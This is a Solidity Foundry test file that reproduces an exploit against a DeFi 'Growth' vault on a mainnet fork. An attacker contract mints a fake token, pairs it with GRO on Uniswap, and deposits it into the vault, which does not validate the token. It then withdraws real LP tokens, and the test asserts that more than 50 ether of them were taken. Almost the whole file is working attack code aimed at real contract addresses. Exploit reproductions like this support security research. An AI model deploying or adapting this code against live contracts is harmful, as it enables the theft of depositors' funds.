// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IGrowthVault {
    function depositToken(
        address token,
        uint256 amount,
        uint256 minShares
    ) external;
    function withdraw(
        uint256 shares
    ) external;
    function balanceOf(
        address account
    ) external view returns (uint256);
}

interface IUniswapV2RouterGrowth {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

contract FakeRebaseToken {
    string public constant name = "rAXZZ";
    string public constant symbol = "AXZ";
    uint8 public constant decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        _mint(msg.sender, 1e40);
    }

    function approve(
        address spender,
        uint256 amount
    ) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(
        address to,
        uint256 amount
    ) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _mint(
        address to,
        uint256 amount
    ) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract GrowthDeFiAttacker {
    IERC20 private constant GRO = IERC20(0x09e64c2B61a5f1690Ee6fbeD9baf5D6990F8dFd0);
    IERC20 private constant REAL_GRO_RAAVE_LP = IERC20(0xfb8e17b39fA9F2375202BC1ED549797606EC9316);
    IGrowthVault private constant VAULT = IGrowthVault(0x0EFB384d843A191c02F5C4470D0f9EC0122a1c0b);
    IUniswapV2RouterGrowth private constant ROUTER = IUniswapV2RouterGrowth(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    FakeRebaseToken private immutable fakeToken;

    constructor() {
        fakeToken = new FakeRebaseToken();
    }

    function attack() external {
        GRO.approve(address(ROUTER), type(uint256).max);
        fakeToken.approve(address(ROUTER), type(uint256).max);

        // The vulnerable vault never verifies that token belongs to its real GRO/rAAVE reserve pair.
        ROUTER.addLiquidity(
            address(GRO), address(fakeToken), GRO.balanceOf(address(this)), 1e29, 1, 1, address(this), block.timestamp
        );

        fakeToken.approve(address(VAULT), type(uint256).max);
        VAULT.depositToken(address(fakeToken), 2e31, 1);
        VAULT.withdraw(VAULT.balanceOf(address(this)));
    }

    function realLPBalance() external view returns (uint256) {
        return REAL_GRO_RAAVE_LP.balanceOf(address(this));
    }
}

contract GrowthDeFiExploitTest is Test {
    IERC20 private constant GRO = IERC20(0x09e64c2B61a5f1690Ee6fbeD9baf5D6990F8dFd0);

    function testExploit() public {
        vm.createSelectFork("https://eth.drpc.org", 11_817_090);
        GrowthDeFiAttacker attacker = new GrowthDeFiAttacker();

        // Only a tiny amount of the legitimate GRO token is needed to seed the fake pool.
        deal(address(GRO), address(attacker), 0.02 ether);
        attacker.attack();

        assertGt(attacker.realLPBalance(), 50 ether);
    }
}
